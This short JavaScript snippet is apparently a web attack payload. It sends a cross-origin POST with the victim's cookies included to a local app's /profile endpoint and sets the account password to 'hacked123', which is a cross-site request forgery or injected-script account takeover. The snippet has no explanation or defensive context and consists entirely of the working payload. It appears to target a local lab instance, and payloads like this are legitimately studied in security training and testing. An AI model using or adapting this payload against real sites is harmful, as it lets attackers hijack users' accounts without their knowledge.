fetch("http://127.0.0.1:5000/profile", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "email=&password=hacked123",
    credentials: "include"
});